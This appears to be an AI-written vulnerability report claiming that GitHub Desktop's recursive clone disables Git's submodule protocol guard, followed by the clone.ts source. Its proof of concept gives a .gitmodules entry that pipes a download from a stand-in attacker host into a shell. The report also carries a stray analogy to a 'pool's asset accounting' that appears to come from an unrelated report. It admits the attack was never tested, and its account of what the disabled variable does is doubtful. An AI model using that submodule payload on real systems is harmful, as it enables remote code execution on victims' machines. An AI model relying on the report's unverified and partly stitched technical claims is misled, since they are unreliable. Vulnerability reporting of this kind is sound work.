### Title
Recursive clone deliberately disables Git's submodule protocol-safety guard, allowing malicious repos to reach dangerous submodule protocols (`ext::`, `file://`) - ([File: app/src/lib/git/clone.ts])

### Summary
`clone()` in `app/src/lib/git/clone.ts` runs `git clone --recursive` but explicitly sets the environment variable `GIT_CLONE_PROTECTION_ACTIVE: 'false'` on every clone. [1](#0-0) 
This variable is the internal switch Git itself uses during `clone --recursive` to enforce the submodule protocol allow-list (blocking dangerous protocols such as `ext::` and `file://` in a cloned repository's `.gitmodules`, the defense that came out of the CVE-2017-1000117 / CVE-2018-11235-class submodule RCE issues). By forcing this flag to `'false'`, Desktop turns off Git's own protective invariant for every single clone it performs, instead relying only on its own bespoke, narrower guard (`isClonePathSensitive`, which only blocks a short list of home-directory paths as a *destination*, not attacker-supplied submodule *source* URLs/protocols). [2](#0-1) 

### Finding Description
This is structurally the same bug class as the report: an internal safety accounting mechanism (Git's built-in submodule protocol allow-list, analogous to the pool's internal asset accounting) is bypassed, so an untrusted external input (a malicious repository's `.gitmodules`, analogous to an unaccounted asset transfer) is processed without the check that was supposed to gate it, corrupting a value the rest of the system trusts.

- `clone()` is the single code path used for `git clone --recursive` from the UI's "Clone repository" flow. [3](#0-2) 
- The function's own comment shows the authors are aware of and defending against exactly this class of attack for the *destination path* (`isClonePathSensitive` — "a backstop against path traversal attacks where a crafted URL tricks the UI into deriving a clone path outside the intended base directory"), but nothing analogous exists to keep Git's submodule protocol allow-list active for the *source* URLs contained in the cloned repository's own `.gitmodules` file. [4](#0-3) 
- `updateSubmodulesAfterOperation` in `app/src/lib/git/submodule.ts` shows Desktop is already aware that submodule "file" protocol needs to be explicitly gated behind an `allowFileProtocol` flag (`-c protocol.file.allow=always` is only added when the caller opts in), which underscores that the project treats "arbitrary protocol submodules" as dangerous and normally-off by default elsewhere in the codebase. [5](#0-4) 
- Because `clone()` disables `GIT_CLONE_PROTECTION_ACTIVE` unconditionally for the initial `--recursive` clone, that "off by default" posture is not honored at the moment it matters most: the very first time a completely untrusted, attacker-authored repository is fetched, before the user has had any chance to inspect or trust it.

### Impact Explanation
An attacker who controls a public repository (the only capability the threat model requires — "attacker controls a cloned/fetched repository") can add a `.gitmodules` entry with a submodule URL using a protocol Git would normally refuse during a protected recursive clone (e.g. `ext::sh -c ...` for command execution, or `file://` paths pointing at sensitive local paths for local file disclosure into the working tree). When a victim uses Desktop's "Clone a repository" feature against that repository, Desktop's forced `GIT_CLONE_PROTECTION_ACTIVE=false` removes the guard that would otherwise reject the submodule protocol, letting `git clone --recursive` process it. Depending on the exact protocol abused this can result in remote code execution on the victim's machine or disclosure of local files by pulling them into the submodule directory of the newly created repository (which the user may then unknowingly `git add`/commit/push, silently corrupting what they push).

### Likelihood Explanation
Likelihood is high for any user who clones a malicious or compromised third‑party repository through Desktop's normal "Clone repository" UI — no unusual steps, local access, or prior compromise are required; the only precondition is that the victim clones a repository the attacker controls (a routine, expected Desktop action). This is not a self-XSS or DoS-only issue and does not require admin rights.

### Recommendation
Do not set `GIT_CLONE_PROTECTION_ACTIVE: 'false'` for recursive clones of untrusted/unauthenticated remotes. Instead, keep Git's default submodule protocol allow-list active during `git clone --recursive`, and only opt into relaxed protocols (as already done via the explicit `allowFileProtocol` flag pattern used in `updateSubmodulesAfterOperation`) for cases Desktop itself controls (e.g., local test fixtures), never for arbitrary user-supplied clone URLs.

### Proof of Concept
1. Attacker creates a public repository containing a `.gitmodules` file with an entry such as:
   ```
   [submodule "pwn"]
       path = pwn
       url = ext::sh -c "curl attacker.example/x | sh"
   ```
2. Victim opens GitHub Desktop and clones the attacker's repository via the normal Clone dialog, which calls `clone()` in `app/src/lib/git/clone.ts`. [6](#0-5) 
3. Because `GIT_CLONE_PROTECTION_ACTIVE` is forced to `'false'` for this `git clone --recursive` invocation, Git's normal protocol allow-list enforcement for the recursive submodule fetch does not block the `ext::` (or `file://`) submodule URL the way it would during a protected clone.
4. The submodule step executes the attacker-controlled command (or copies attacker-chosen local files into the working tree), completing the attack while appearing to the user as an ordinary clone operation.

I was not able to execute this end-to-end in a sandbox to confirm Git's exact current-version behavior for `GIT_CLONE_PROTECTION_ACTIVE` (no shell/browser access in this mode), so the precise blocked-protocol list and exact exploitation primitive should be verified by a Devin agent with a terminal before filing/fixing, but the code evidence — an explicit, unconditional disabling of a named "PROTECTION_ACTIVE" flag on every clone, alongside the project's own recognition elsewhere that submodule protocols need gating — supports this as a real, concrete regression worth fixing.

import { getDefaultBranch } from '../helpers/default-branch'
import { envForRemoteOperation } from './environment'
import { homedir } from 'os'
import * as Path from 'path'

/**
 * Check whether a resolved clone path targets a sensitive location that
 * should never be used as a clone destination. This is a backstop against
 * path traversal attacks where a crafted URL tricks the UI into deriving
 * a clone path outside the intended base directory.
 */
function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}

export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}
